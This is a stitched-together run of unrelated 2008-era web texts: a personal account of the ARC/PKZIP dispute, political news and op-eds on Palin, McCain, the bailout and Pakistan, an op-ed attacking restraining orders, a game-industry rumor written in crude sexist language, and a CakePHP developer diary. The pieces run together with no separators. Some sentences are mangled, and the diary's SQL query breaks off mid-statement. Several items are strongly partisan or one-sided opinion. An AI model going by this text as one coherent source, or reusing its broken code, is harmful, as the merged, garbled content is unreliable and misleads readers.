There is also a documentary that runs about 20 minutes and includes interviews with many of the people involved .
In 1985 I wrote a program called ARC .
It became very popular with the operators of electronic bulletin boards , which was what the online world consisted of in those pre-Internet days .
A big part of ARC 's popularity was because we made the source code available .
I know that seems strange these days , but back then a lot of software was distributed in source .
Every company that made computers made a completely different computer .
Different architectures , operating systems , languages , everything .
Getting a program written for one computer to work on another was often a major undertaking .
Then sometime around 1987 or so Phil Katz came out with PKARC , which was basically my ARC program with the compression / decompression routines rewritten in assembler , which made it run a lot faster .
I have to hand it to him , he had a real talent for assembly coding .
We approached him about licensing , but he rejected the idea .
One thing led to another , and eventually we sued him .
Fortunately his program was such a blatant copy of mine that we were able to win the lawsuit before we ran out of money .
In a negotiated settlement he again rejected any suggestion of licensing and went for a cash - out settlement .
He repaid us for most of our legal bills and promised to stop selling his program sometime in 1988 .
Then he fiddled with the file format a bit , renamed it from PKARC to PKZIP , and kept right on selling it .
We sort of lost touch after that .
We would have liked to have kept in touch , but we could n't afford the legal bills .
There was n't a lot to sue for anyway .
None of us was getting rich .
So now Phil Katz is dead .
He drank himself to death , alone in a motel room , a bottle of booze in his hand and five empties in the room .
One can only guess what drove him to such a tragic end , but it is a fitting demise for a man whose professional reputation is based entirely on a lie .
I can think of no more fitting epitath than the final clause of the original ARC copyright statement :
Reporter Holds Irresponsible DuPage County , IL Board of Election Feet to the Fire ...
Brad Friedman Byon
9/18/2008 , 11:05 am PT
Here 's a welcome sign that at least some in the corporate media are finally beginning to understand the complicated threat to democracy that is the boondoggle of electronic voting .
Bill Mego , in the Naperville Sun , asks all of the right questions ( and granted , they are complicated ones to understand , unless one tries ) about the junk Diebold voting system irresponsibly employed , at great tax - payer expense , by the DuPage County , IL Board of Elections .
One could as easily replace " Diebold " in the above sentence with any other voting system vendor , and " DuPage " with almost any other county in the nation ( even though DuPage features one of the worst Election Boards in the country , and you 'll be hearing still more about them soon ) .
But the " good news " for today : at least a few in the media --- okay , at least Bill Mego --- finally " get " it , and are beginning to serve their readership well .
Let 's get a few hundred more and we 'll be in business .
( And I 'd be out of it !
Happily ! )

After Electronic
Arts failed to acquire Take - Two Interactive , a rumor started that EA , like a poon - hungry college kid spurned by a cheerleader , would go find some random fat chick to sate his urge .
Namely , Epic Games .
Turns out EA does n't do cellulite , though .
Okay , Epic Games is n't a fat chick .
They 've goton the way and that should net a tidy profit ; as you may recall , the EA / Take - Two negotiations first started to heat up in the time leading up to the .
Perhaps just as importantly , Epic develops the Unreal Engines .
EA getting exclusive rights over Unreal Engine 4 ?
Sounds like a pretty good deal if you can pull enough coin together .
That was GameGuru 's thinking , anyway .
Turns out EA is n't buying Epic , though .
Epic VP Mark Rein told VG247 today that the rumor is Not exactly a tough word to parse .
Oh well , guess everyone 'll have to find another reason to badmouth EA today .
The Anthrax Case Reopens : Why Did the FBI Let the Fort Detrick Scientists Investigate Themselves ?
Tuesday 30 September 2008
by : Bill Simpich , t r u t h o u t
The past week 's Congressional anthrax hearings revealed that public pressure is keeping the doors open in the anthrax case .
FBI Director Robert Mueller promised that the FBI will provide their evidence to a panel of experts for scientific evaluation .
The battle will now turn to the independence of this panel , and whether " all evidence " or merely " scientific evidence " will be under review .
During the hearing , Mueller found himself under fire by Senator Patrick Leahy and Congressman John Conyers for not having answers to their questions .
Republican Arlen Specter was furious at Mueller for his unwillingness to assure them that Congress would have a role in determining the panel 's composition .
Meanwhile , new evidence shows just how deeply wrong ABC and Washington Post reporters have been over the years on their coverage of the anthrax attacks .
They can't have it both ways :
Either they made repeated " mistakes " by relying on their sources , or several people deliberately lied in order to advance war on Iraq .
In his recent book Taking Heat , former White House secretary Ari Fleischer wrote that Bush was more shook up by the anthrax attacks than by any other event .
White House officials repeatedly pressed Mueller to prove it was a second - wave assault by al - Qaeda or Iraq .
After days of provocative statements designed to scare the American people , Cheney himself believed that he had been exposed to anthrax .
Although the test results were negative , October 18 , 2001 , was the moment when Cheney decided to withdraw to an " undisclosed location " and carry biodefense protection during all of his mysterious travels .

The True Story Is Emerging ....
WASHINGTON 
The Senate strongly endorsed the $ 700 billion economic bailout plan on Wednesday , leaving backers optimistic that the easy approval , coupled with an array of popular additions , would lead to House acceptance by Friday and end the legislative uncertainty that has rocked the markets .
In stark contrast to the House rejection of the plan on Monday , a bipartisan coalition of senators  including both presidential candidates  showed no hesitation in backing a proposal that had drawn public scorn , though the outpouring eased somewhat after a market plunge followed the House defeat .
The Senate margin was 74 to 25 in favor of the White House initiative to buy troubled securities in an effort to avoid an economic catastrophe .
Only Senator Edward M. Kennedy , who is being treated for brain cancer , did not vote .
The two Senate leaders , Senators Harry Reid , Democrat of Nevada and the majority leader , and Mitch McConnell of Kentucky , the Republican leader , strongly urged their colleagues to approve the plan despite the political risk given public resentment .
“ Supporting this legislation is the only way to make the best of a crisis and return our country to a path of economic stability , prosperity and growth , ” said Mr. Reid , who asked that senators vote formally from their desks .
The presence in the Senate of both presidential candidates in the final weeks of the campaign also gave weight to the moment .
The political tension was clear as Senator Barack Obama walked to the Republican side of the aisle to greet Senator John McCain , who offered a chilly look and a brief return handshake .
We thought we'd heard the last of this whole AT&T / Starbucks WiFi deal yesterday , but alas , we were terrifically mistaken .
AT&T has come forth today with two fluffy press releases that flesh out the details , and amazingly , there are some inclusions that we were n't made aware of yesterday .
For starters , all iPhone / iPhone 3G customers will now have free ( and seemingly limitless ) access to AT&T WiFi hotspots across the US -- we 're talking Starbucks , Barnes & Noble , the whole lot .
Additionally , the carrier has welcomed select BlackBerry users -- that 's the Bold for now , the Pearl 8120 8820 " later this year " -- into the same deal , though the official verbiage mentions that an " unlimited data plan " is required .
If you did n't make the cut this time , fret not -- AT&T has plans to invite " more mobile devices " into the fold here shortly .

Their value was in the symbolism .
" Look , I 'm married ! " or " Forget him ; he 's married . "
Today many who tie the know want something that also symbolizes their individual styles , or rings to set this pair apart from other couples .
These individualistic rings not only tell you that someone is married , they can often tell you who they are married to , if you can find the other unique ring in the crowd .
Binary Rings
With a binary ring , you can engrave a coded message of your choice , up to 20 characters .

Gee , what interesting timing for McCain to attack Obama over the welfare of little children .
McCain and Palin knew this story was coming – Newsweek contacted them for comment – and I think they they launched the “ education ” ad and the latest “ you ’re all sexists ! ” attack in an effort to divert attention from this story .
It ’s pretty damning , and makes Palin look kind of nasty – barracuda nasty , and not in the way McCain had hoped the public would see her , I suspect .
I ’m gonna go out on a limb here and guess that neither the Obama nor the Bidens have ever had a judge warn them about potential child abuse .
Sarah Palin is increasingly not looking the poster child for Republican family values .
Newsweek
An Anchorage judge three years ago warned Sarah Palin and members of her family to stop “ disparaging ” the reputation of Alaska State Trooper Michael Wooten , who at the time was undergoing a bitter separation and divorce from Palin ’s sister Molly .
Allegations that Palin , her husband Todd , and at least one top gubernatorial aide continued to vilify Wooten — after Palin became Alaska ’s governor and pressured state police officials to take action against him — are at the center of “ Troopergate , ” a political and ethical controversy which has embroiled Palin ’s administration and is currently the subject of an official inquiry by a special investigator hired by the state legislature .
Court records obtained by NEWSWEEK show that during the course of divorce hearings three years ago , Judge John Suddock heard testimony from an official of the Alaska State Troopers ’ union about how Sarah Palin — then a private citizen — and members of her family , including her father and daughter , lodged up to a dozen complaints against Wooten with the state police .
The union official told the judge that he had never before been asked to appear as a divorce - case witness , that the union believed family complaints against Wooten were “ not job - related , ” and that Wooten was being “ harassed ” by Palin and other family members .
Court documents show that Judge Suddock was disturbed by the alleged attacks by Palin and her family members on Wooten ’s behavior and character .
“ Disparaging will not be tolerated — it is a form of child abuse , ” the judge told a settlement hearing in October 2005 , according to typed notes of the proceedings .
The judge added : “ Relatives can not disparage either .
If occurs [ sic ] the parent needs to set boundaries for their relatives . ” ….
“ It is the mother ’s [ Hackett ’s ] responsibility to set boundaries for her relatives and insure [ sic ] they respect them , and the disparagement by either parent , or their surrogates is emotional child abuse , ” Judge Suddock wrote … .
Initially , Palin indicated she would cooperate with the investigation .
But more recently , a lawyer hired by the state to represent her in the case asked the Alaska Attorney General to request that a state personnel board conduct its own special - counsel inquiry and demanded that the state legislature back off .

LOD , Israel ( Reuters ) - Israel has introduced a step - on scanner that spares airline travelers the nuisance of having to remove their shoes so they can be X - rayed for hidden weapons , though the new device cannot yet sniff out explosives .
Only the shoes of passengers deemed suspicious by Ben-Gurion Airport staff are removed , X - rayed and swabbed for bomb residues .
Most people can now keep their shoes on .
Installed next to the walk - through scanners at Ben-Gurion , “ MagShoe ” announces within two seconds whether the footwear of the passenger standing on it contains unusual metal that might be a knife for a hijacking or a bomb detonator part .
“ This innovation brings enormous logistical value as it significantly cuts down the discomfort and delays associated with standard shoe searches , ” said Nissim Ben-Ezra , security technologies manager for Israel ’s Airports Authority .
But he said MagShoe must be used in conjunction with other precautions , especially as it would not spot hidden explosives -- a major concern after the botched 2001 “ shoe bombing ” by al Qaeda sympathizer Richard Reid aboard a Paris - Miami flight .
A bomb - sniffing version of the suitcase - sized MagShoe is in the works , an Israeli security source said .
The current version , produced by Israeli firm Ido Security Ltd. , costs about $ 5,000 .
The U.S. Transportation Security Administration is assessing MagShoe ’s feasibility for American airports and several other countries have expressed an interest , the Israeli source said .

No Restraint on Restraining Orders
BY STEPHEN BASKERVILLE
The increased use of restraining orders in alleged domestic violence cases is being advocated in states across America .
In Maryland , one proposal would allow court commissioners rather than judges to issue protective orders .
The Washington Post calls it an “ unlikely subject for controversy ” and validates this assessment by ignoring voices of opposition .
Indeed , no national debate has ever taken place on restraining orders .
Yet it is time the public understands the danger they pose to constitutional rights .
The Post claims that the potential for abuse is “ minimal . ”
In fact , the potential for abuse is already being realized .
A judge quoted in the New Jersey Law Journal in 1995 calls the restraining order law “ probably the most abused piece of legislation that comes to my mind . ”
Parents issued with restraining orders based on uncorroborated allegations are summarily evicted from their homes and jailed for contacting their children and spouses .
“ Stories of violations for minor infractions are legion , ” the Boston Globe reported in 1998 .
“ In one case , a father was arrested for violating an order when he put a note in his sons suitcase telling the mother the boy had been sick over a weekend visit .
In another , a father was arrested for sending his son a birthday card . ”
“ The restraining order law is one of the most unconstitutional acts ever passed , ” says Massachusetts attorney Gregory Hession , who has filed a federal suit on constitutional grounds .
“ A court can issue an order that boots you out of your house , never lets you see your children again , and takes your money , all without you even knowing that a hearing took place . ”
As if to validate Hessions charge , New Jersey municipal judge Richard Russell actually urged his colleagues to violate basic constitutional protections : “ Your job is not to become concerned about the constitutional rights of the man that you re violating as you grant a restraining order , ” he told a judges training seminar in 1994 .
“ Throw him out on the street , give him the clothes on his back and tell him , see ya around .
. . .Â
We dont have to worry about the rights . ”
The real purpose of restraining orders is not so much to prevent violence as to eliminate one parent during divorce proceedings .
This is now common knowledge in legal circles .
Elaine Epstein , former president of the Massachusetts Womens Bar Association , writes that “ allegations of abuse are now used for tactical advantage ” in divorce courts and that restraining orders are doled out “ like candy . ”
“ Everyone knows that restraining orders and orders to vacate are granted to virtually all who apply , ” and “ the facts have become irrelevant , ” she reports .
“ In virtually all cases , no notice , meaningful hearing , or impartial weighing of evidence is to be had . ”
Yet a government analysis found that fewer than half of all restraining orders involved even an allegation of physical violence .
Restraining orders are an indispensable tool to keep the regime of unilateral ( or “ no - fault ” ) divorce in business , because they prevent involuntarily divorced parents from running into their children in public places .
Anyone can attend a childs first communion or little league game , after all  anyone but their forcibly divorced father , who will be arrested if he shows up .
How restraining orders can prevent violence is unclear .
Violent assault is already criminally punishable .
A father whose wife obtained a protective order against him was , according to the St. Petersburg Times , “ enjoined and restrained from committing any domestic violence upon her . ”
But is he not thus enjoined and restrained to begin with , along with the rest of us ?
The conclusion seems inescapable that the purpose is not to protect anyone from violent fathers but to protect the power of divorce practitioners from peaceful ones .
In fact , restraining orders very likely create violence , since forcing a parent to stay away from his or her children can provoke precisely the violence it ostensibly intends to prevent .
“ Few lives , if any , have been saved , but much harm , and possibly loss of lives , has come from the issuance of restraining orders , ” Dudley District Court Justice Milton Raphaelson wrote last year in the Western Massachusetts Law Tribune ( only upon his retirement ) . Â
A report just released by the Heritage Foundation confirms that the safest arrangement for mothers and children is a married , intact family .
“ Marriage dramatically reduces the risk that mothers will suffer from domestic abuse , ” concludes the report .
By providing a tool to tear families apart , restraining orders are creating the very problem their promoters claim to be solving .

• Parliament vows to end military action on border • Relations with US will be strained by new strategy
Serious doubts multiplied yesterday about Pakistan 's commitment to America 's military campaign against al - Qaida and the Taliban after parliament overwhelmingly passed a resolution calling for dialogue with extremist groups and an end to military action .
The new strategy , backed by all parties , emerged after a fierce debate in parliament where most parliamentarians said that Pakistan was paying an unacceptable price for fighting " America 's war " .
If implemented by the government , support for Pakistan from international allies would come under severe strain , adding further instability to a country facing a spiral of violence and economic collapse .
" We need to prioritise our own national security interests , " said Raza Rabbani , a leading member of the ruling Pakistan People 's party .
" As far as the US is concerned , the message that has gone with this resolution will definitely ring alarm bells , vis-a - vis their policy of bulldozing Pakistan . "
The resolution , passed unanimously in parliament on Wednesday night demanded the abandonment of the use of force against extremists , in favour of negotiation , in what it called " an urgent review of our national security strategy " .
" Dialogue must now be the highest priority , as a principal instrument of conflict management and resolution , " said the resolution .
" The military will be replaced as early as possible by civilian law enforcement agencies . "
It also said Pakistan would pursue " an independent foreign policy " and , in a pointed reference to US military incursions into Pakistani territory , proclaimed that " the nation stands united against any incursions and invasions of the homeland , and calls upon the government to deal with it effectively " .
The force of the resolution was unclear last night , with differences in interpretation between the ruling People 's party and opposition .
The document is not binding on the government even though it was party to it .
The army remains the ultimate arbiter of security policy .
Some analysts believe that differences between the parties will see a tussle over implementation that could temper the resolution 's thrust .
The US response was muted , with officials saying they considered it rhetoric for domestic consumption .
But the intense American pressure on Islamabad to take on the militants was underlined yesterday by another US missile strike inside Pakistani territory , an instance of the heavy - handed intervention that parliament railed against .
The attack came in Pakistan 's border area with Afghanistan , at an Islamic school being used by suspected extremists , killing 11 .
The madrasa was linked to Afghan Taliban commander Jalaluddin Haqqani , who has an extensive network in Pakistan .
There have been about a dozen US missile strikes inside Pakistan since the beginning of September and a ground assault , fanning widespread anti-Americanism in the country .
The US and Nato depend on Pakistan to prevent its tribal area being used as a safe haven for Afghan Taliban .
Past attempts by Pakistan at making peace with militant groups in the tribal area have allowed them to regroup and led to a sharp increase in cross - border attacks against coalition forces in Afghanistan .
Yesterday a US official made clear what it expected .
" Pakistan needs to and is attacking insurgents in its northern areas , " Patrick Moon , a deputy US assistant secretary of state , said during a visit to Kabul .
" Sanctuaries for Afghanistan Taliban in Pakistan complicate our security operations .
Pakistani Taliban and other extremists such as al - Qaida are posing a threat to the stability of Pakistan . "
Pakistan is confronting multiple crises , political , security and financial , which threaten to overwhelm the nuclear - armed country and push it into chaos .
It is heading towards bankruptcy , forcing Islamabad this week to approach to the International Monetary Fund for a rescue package .
But the IMF bailout could be jeopardised if Washington is not on board .
Ordinary people complain that the country feels like it is falling apart , with a severe shortage of electricity causing blackouts of 12 hours or more in many areas , and crippling food price inflation , running at up to 100 % , swelling the numbers living below the poverty line .
The country 's north - west , especially its tribal border area with Afghanistan , is under the control of Taliban and al - Qaida , who are connected to militant groups that have networks across the country .
Yesterday , in what is now a typical day for Pakistan , aside from the US missile strike , eight anti-Taliban tribal leaders were killed by militants in the Orakzai part of the tribal area , and the army killed 20 fighters in Bajaur , another part of the tribal belt .
In Swat , a valley in the north - west , the headless body was found of a policeman , previously kidnapped by Taliban , and posters went up in Swat warning women against shopping in markets , saying it was " unIslamic " .
" Our country is burning , " said Senator Khurshid Ahmad , a member of Pakistan 's upper house of parliament for Jamaat - e - Islami , a mainstream religious party .
" We do n't want Bush to put oil on the fire .
We want to extinguish this fire . "
Sherry Rehman , minister for information , said the motion was a " firm resolve to combat terrorism " .
But Talat Masood , a retired general and security analyst , said : " The army will be disappointed there was not a clear consensus .
I think the army will continue with the existing policy . "
Backstory
Pakistan 's tribal territory , formally known as the Federally Administered Tribal Areas ( Fata ) , is a legacy of the Raj , a 10,000 square mile sliver of territory that has become central to geopolitics and the homeland security of the US , Britain and Europe .
The laws of Pakistan do not extend to the tribal belt , which is run under its own punitive laws and tribal custom , a system developed by the British .
Fierce customs mean that men all carry guns , and guests , including al - Qaida militants , must be protected .
Al - Qaida 's leadership and thousands of Taliban escaped the US war in Afghanistan after September 11 2001 by slipping into the tribal area , which runs along the border .
Under a treaty with the tribes , the Pakistan army was not allowed to enter the Fata , but the accord broke in 2004 under US pressure calling for al - Qaida bases to be disrupted .
This sparked a tribal insurrection and pushed the locals towards extremism , creating a Pakistani Taliban .
Taliban militants killed hundreds of traditional leaders and now control most of the Fata , imposing a rough and ready Islamic law , though it is believed that most tribesmen remain moderate .
It ’s been a fun few days in the criminal case of Sen .
Ted Stevens ( R - AK ) .
The senior senator from Alaska was charged last month for not disclosing $ 250,000 in gifts from an Alaskan oil company .
His lawyers have been pushing to get the trial started right away , and to move it to Alaska .
They also argued yesterday that the prosecution of Stevens was trampling the blessed independence of the legislative branch .
( Stevens has also said he 's innocent . )
Prosecutors have pushed back and last night offered up a near - avalanche of new allegations .
After last month detailing an alleged home makeover and cut-rate Mustang , prosecutors now claim ( PDF ) that the oil company , VECO , also plied Stevens with a Jeep Grand Cherokee for his daughter and a job for his grandson .
Prosecutors also point to a suspicious 2001 $ 5,000 Florida real estate investment with a âpersonal friend.â 
That friend , a partner of the company that developed the property , allegedly gave Stevens a $ 31,000 no-interest loan to help him purchase the condo .
Stevens did not disclose the loan on his Senate disclosure forms , prosecutors write .
Six months after Stevens put only $ 5,000 down , the friend allegedly helped arrange for another buyer to buy the property at a $ 130,000 profit for Stevens .
Then there ’s a generator .
The motions ( PDF ) quote an e-mail Stevens sent in 1999 :
" Incidentally , I asked Bill Allen to hook up a generator to our chalet for Y2 K – JUST IN CASE !! "
According to prosecutors , Stevens got his generator , and as with the rest of the gifts , seems to have forgotten to mention it on his Senate disclosure forms .
Prosecutors also point out another thing that caught our eye .
They quote ( PDF ) two e-mails Stevens allegedly sent last year to somebody -- identified as " Person A " -- who was about to testify in front of a grand jury on the case .
" I hope we can work something out to make sure you are n't led astray on this occasion , " Stevens wrote ( PDF ) in the first e-mail .
Stevens followed up with a second e-mail , complete with a helpful tip : " do n't answer questions you do n't KNOW the answers to . "
Capitalization , as the prosecutor 's motion notes , in the original .

John McCain ’s two most loyal supporters and most influential foreign policy advisers , Joe Lieberman and Lindsey Graham , have an Op - Ed in The Wall St. Journal today proclaiming that " Russia ’s invasion of Georgia represents the most serious challenge to this political order since Slobodan Milosevic unleashed the demons of ethnic nationalism in the Balkans . "
Just as their neoconservative comrade , Fred Hiatt , does in today ’s Washington Post , Lieberman and Graham demand that the U.S. expend vast resources and assert itself both militarily and politically in order to thwart the New Russian Menace ( " This means reinvigorating NATO as a military alliance , not just a political one . . .
The credibility of Article Five of the NATO Charter — that an attack against one really can and will be treated as an attack against all — needs to be bolstered .
. . . The Georgian military should be given the antiaircraft and antiarmor systems necessary to deter any renewed Russian aggression " ) .
The painful absurdity of hard - core warmongers who supported the invasion of Iraq ( and , in Lieberman ’s case , advocating we do the same to Iran and Syria ) parading around as defenders of the " political order " is too self - evident , and by now too common , to merit much comment .
But this warning from the neoconservative duo about the folly of imperialistic Russian policies is really a sight to behold :
In the long run , a Russia that tries to define its greatness in terms of spheres of influence , client states and forced fealty to Moscow will fail — impoverishing its citizens in the process .
The question is only how long until Russia ’s leaders rediscover this lesson from their own history .
To recap : the U.S. is going to impede Russian aggression , re-build and protect Georgia , revitalize the military strength of NATO , and restore peace and order to Europe .
We ’re going to stare down the Hitlers of Iran ( also in the Post today , Lieberman comrade — the super - tough - guy and Iran obsessive Micheal Rubin — lashes out at Joe Biden for " blinking on Iran " and being " Tehran ’s favorite senator " ) .
We ’re going to re-build , occupy and safeguard Iraq for decades if necessary .
We will single - handedly promote Israel ’s interests and view each of its enemies and its wars as our own .
We ’re also going to get much tougher on China , just like Russia :
A John McCain presidency would take to a more forceful approach to Russia and China , according to senior foreign policy advisers to the Republican candidate .
. . .
Robert Kagan , who wrote much of the [ foreign policy ] speech delivered [ by McCain ] in Los Angeles , told the Daily Telegraph : " Russia will loom large for both Europe and the US , and John McCain has been ahead of the curve and has seen this coming down the road .
. . . While continuing a " multi- faceted approach " to Beijing , [ McCain foreign policy adviser Max ]
Boot said the US needs " to be forthright on their human rights abuses and not shrink from condemning what they are doing in Tibet for example , or from trying to help Chinese dissidents to stay out of jail " .
And we ’re going to do all that while cutting taxes further .
But remember : it ’s Russia , bulging with cash from oil exports , that better realize — for their own good — that its efforts " to define its greatness in terms of spheres of influence , client states and forced fealty to Moscow will fail — impoverishing its citizens in the process . "
The foreign policy team exerting chief influence over John McCain is truly more extremist — in a purer and more deranged form — than the foreign policy team of the Bush administration .
They ’re not only the most extremist faction in American political life , but also the most delusional .
These are n’t just the people who led the U.S. to war in Iraq — though they are that — but they ’re also the ones who actually believe that the Bush administration has been far too meek in its assertion of U.S. military force and too passive in its interference in the affairs of other countries .
They want to accelerate — massively intensify — virtually every one of the polices that has brought the U.S. to such disgrace and near ruination over the past eight years .
There is nothing " moderate " or " centrist " about any of them .
John McCain is the Candidate of Bill Kristol and Joe Lieberman and John Bolton for good and clear reasons ( including in Georgia ) : he ’s the best and most devoted instrument to advance their militaristic agenda .
Is there any real discussion of any of that ?
Hardly .
Here ’s the trite soap opera pablum and royal court intrigue which , instead , dominates our media ’s campaign coverage :
Riveting .
Being in Denver has meant that I ’ve been in the proximity of the herds of establishment media figures for the first time , to actually hear what they say and how they conduct themselves off camera , and it ’s all exactly the same .
The only topics they ’re capable of thinking about are the same ones they chatter about on the TV — is Obama Making a Mistake by speaking in the stadium because the heartland Americans ( who they know and understand so well ) will think he ’s too big for his britches ?
What Must Hillary Do? How will Michelle Play in the Bowling Alleys ?
To say it ’s bereft of substance is to understate the case dramatically .
Digby was on some " media vs. bloggers " panel yesterday with Newsweek ‘s Jonathan Alter and the Post ‘s Chris Cilizza and — after Alter ranted that bloggers , to cite Digby ’s summary , " have a psychological condition called ‘ disinhibition ’ — like Alzheimers patients " ( as contrasted with the extreme psychological health and balance displayed by Alter when he demanded , in an article excerpted at length by Digby , that the U.S. Government torture people ) — this is what happened :
Ari Melber asked the pertinent question about how a reporter can possibly fail to call out illegal and immoral acts like wiretapping and torture for what they are , under some misguided definition of objectivity or neutrality .
Cilizza answered the question honestly , admitting that they do n’t do a good job of it .
When Cilizza said " they do n’t do a good job of it , " what he was referring to was " reporting on and covering what the Government of the U.S. actually does . "
If they do n’t do that well , what do they do well ?
And Cilizza is right — they do n’t do a " good job " of that because they do n’t do it at all ( along those lines , Jerry and Joe Long have a super - concise and appropriately acerbic post on just some of the media ’s Convention behavior that is quite worth reading ) .
John McCain himself , and especially those who whisper foreign policy wisdom in his ear , have long had a lengthy list of New Enemies We Must Confront in the World — beyond those we ’re already fighting .
They not only want to add China , but now especially Russia , to that list , without the slightest concern for the severe degradation they have already imposed on the U.S. military and America ’s economic security ( but , Lieberman and Graham warn , Russia will go bankrupt if they have a 10 - day border skirmish with a neighboring state ) .
But infantile calls for Standing Tall in the Face of American Enemies and Not Blinking is still the definition of Seriousness in American political discourse , and the pure derangement and extremism that lies at the heart of this McCain foreign policy mentality will thus continue to go largely unexamined .

There have been more acts of intimidation directed at the campaign of Toronto Liberal candidate Carolyn Bennett .
Police are already investigating a number of acts of vandalism — including cutting the brake lines on cars — against Bennett supporters in Toronto 's St. Paul 's riding over the weekend .
On Monday the harassment continued .
" A family with a sign … received a threatening phone call saying , ' Take your sign down or you 'll be next , ' " Bennett told CBC News on Tuesday .
" Two other people later last evening [ Monday ] called with a similar story .
" They were very , very frightened , " said Bennett who said she believes the most recent actions are " an intimidation tactic as opposed to this life - threatening approach to the brake line which has just sickened us all . "
Toronto police launched a criminal investigation on the weekend after more than 30 cases of vandalism were reported in St. Paul 's and in Parkdale - High Park .
At least 17 of the cases involve cutting of automobile brake lines .
Some homes and garages were sprayed with anti-Liberal graffiti in the riding .
Police said the only connection between all of the cases was that all of the victims had signs supporting Bennett on their lawns .
Bennett said Tuesday that although some people in her riding have asked for the signs to be taken down , others have asked her campaign to put up signs , as a way of showing they wo n't be intimidated .
" One person even phoned and said , ' I 'm not voting for you , but I want your sign , ' " she said .
Liberal supporters were also victimized in similar incidents during byelections in Guelph in August and in north Toronto , in the Willowdale riding , in March .
Birmingham International Airport last week released its 2007 - 2008 Report and Accounts ( pdf ) - an engrossing 33 - page read which explains why the facility " increasingly offers a high - quality alternative for those Midlands passengers who currently fly from other airports , to travel instead from Birmingham " .
Well , there 's one passenger who will in future choose to fly from anywhere other than Brum , and that 's the owner of this item of luggage , featured in all its glory on page 11 :
Yes indeed , it 's beers all round for the sharp - eyed News of the World which spotted this slight oversight .
One delighted airport worker told the paper : “ It ’s a bit of a cock - up .
We find it absolutely hilarious , but it ’s a huge embarrassment for the bosses . ”
A spokesman for the airport offered : “ At least it shows the more unusual and sometimes sensitive items our security guards deal with on a day - to - day basis . ”
We 're looking forward to Birmingham International Airport 's 2008 - 2009 report , which will doubtless feature a candid snap of just how sensitively security operatives " deal with " nipple rings . ®
Well , well , well .
Here ’s yet another subplot in the saga that is Troopergate .
Remember how witnesses , including state employees , Todd Palin and Sarah Palin herself agreed to cooperate fully with the Legislative investigation of Troopergate ?
If you do n’t remember , it ’s because that was beFORE August 29th , when Palin was selected to be John McCain ’s running mate .
It was a whole different world back then .
That ’s when this investigation made sense to Alaskans , and when we believed the word of our Governor .
Now ?
Not so much .
Ten witnesses , including the Governor ’s husband Todd , defied subpoenas to testify before the Legislative Council .
When did this mysterious change of heart occur ?
Once again , we need to rely on the courage and conviction of the bipartisan Legislative Council , and the likes of Representatives Les Gara to keep the Governor and her administration ( including Attorney General Talis Colberg ) honest .
After the flock of McCain lawyers descended on our sleepy little hamlet , all the rules changed .
Now , Les Gara and Audie Holloway want to know WHY .
Good question .
ANCHORAGE — Today an Alaska legislator called on the State ’s Attorney General to appoint an independent investigator to look into possible criminal witness tampering by McCain - Palin campaign staff in Alaska .
Rep. Gara ’s call came at the suggestion of the Director of the Alaska State Troopers , [ Col. Audie Holloway ] , who called the potential of witness tampering matter “ serious . ”
But , as we know , these witnesses did eventually testify in writing , just days before the Legislative Council released the findings of Independent Investigator Stephen Branchflower .
Does this make it all better ?
No .
Their later decision to submit to written questions , after failing to show up for their subpoenas , does n’t cure this violation , or any criminal conduct by any person who attempted to induce those witnesses from showing for their subpoenas .
Complying with the law after breaking it does n’t excuse a criminal violation .
If any person attempted to induce a witness to fail to show for a subpoena , that witness ’ later cooperation , after failing to show for the subpoena , does n’t cure the criminal conduct .
( from attached letter to AG Talis Colberg from Rep. Les Gara )
Talis Colberg , who is under considerable public pressure to resign as Attorney General for how he handled these subpoenas , has something new on his list of things that wo n’t go away .
Namely :
Alaska Statute 11.56.545 – “ ( a ) Tampering with a witness in the second degree : A person commits the crime of tampering with a witness in the second degree if the person knowingly induces or attempts to induce a witness to be absent from an official proceeding , other than a judicial proceeding , to which the witness has been summoned .
( b ) Tampering with a witness in the second degree is a class A misdemeanor .
AS 11.56.540 has similar elements , and is a felony .
The ball is in the court of the Department of Law .

Once the Commodity Futures Trading Commission ( CFTC ) issued a report saying speculators were not driving up oil prices , one would have thought Congress might have stopped blaming this popular scapegoat .
Please .
If speculators are n't responsible for $ 120 oil , then the legislators who failed to develop a sustainable energy plan in the 25 years since the last oil crisis are responsible for $ 120 oil .
And it 's no surprise why Congress is n't blaming them .
So , at Congress 's request , the U.S. Inspector General has officially begun an investigation into the very government report that claimed supply - and - demand fundamentals were they key behind the oil spike .
A group of four senators requested the probe , alleging the CFTC knowingly included " seriously flawed " data and that the timing was " suspicious . "

Constructing SQL statement for the search
Yep , today I need to finish the Profile search for the admin part .
As I mentioned , the search is only by fields of experience , so there is no big and scary where clause / especially if you want to cover all cases , like splitting the words with AND , OR etc. will cause huge where with all possible combinations / .
There are 2 specific requirements here :
The results need to be ordered by relevance and the report need to show fields of competence which are match to the search criteria next to each row /user / .
What does it means ?
Let ’s say there are 2 users .
First one has following skills like Java , PHP , MySQL , HTML and JavaScript , the second one knew only JavaScript and HTML , so when we search for users matching criterion PHP and HTML , the search results need to be ordered like this :
User1 – matching fields : PHP , HTML – relevance 2 criteria matched
User2 – matching fields : HTML – relevance : 1 criteria matched
and so on .
At first glance it look like I had to build huge SQL including few sub queries or functions for fetching the fields of relevance and matching fields and I was prepared for at least one day to accomplish this task , but in fact it was very fast .
The solution was in GROUP_CONCAT function in mysql .
as well as few groupings .
I love Mysql !!! 🙂
Here is the final sql which drive this report :
SELECT
ProfileUser . id ,
ProfileUser .
name ,
Profile .
phone ,
Profile .
mobile ,
ProfileUser .
email ,
GROUP_CONCAT (
DISTINCT CategoryParent .

parent_ordering , CategoryParent .

profile_id = Profile . id AND

Working over advanced tab navigation
As I mentioned earlier , I ’ve decided to split the profile into 4 main parts : General information , Fields of knowledge , Additional information and Disclaimer confirmation .
I ’ve used the JS Tabber class which working fine , but I ’ve decided to duplicate the switch between tabs with next - prev buttons – I wanted to create something like step - by - step wizard .
There were few problems , mostly how to handle events and translate them to the JS Tabber script , but reading the manual and digging the code of the library I ’ve managed to handle this .
I believe that there is most elegant way to make this script , but the desired functionality is done and most important – it ’s working .
Building the interface for the search functionality
Returning on the search functionality I ’ve finally decided to store the search criteria in the database .
Someone could say that this is not appropriate and the better approach is to store the search results .
To prevent double work I ’ve spoke with the responsible user from the client side and we decided that first option is what they need .
Briefly , interface of storing the results is very simple .
There is a link which store the selected criteria into a table allowing users to assign a name of the set .
The second part is to load the stored criteria into the search form , so users can directly submit the form , or they could change criteria .
Working with Ajax in CakePHP is piece of cake 🙂
Conclusion of the day :
I think it ’s almost done .
There are need to finish the design as well as testing it on different browsers than Firefox / which I know it will be a pain :(/
To be continued …

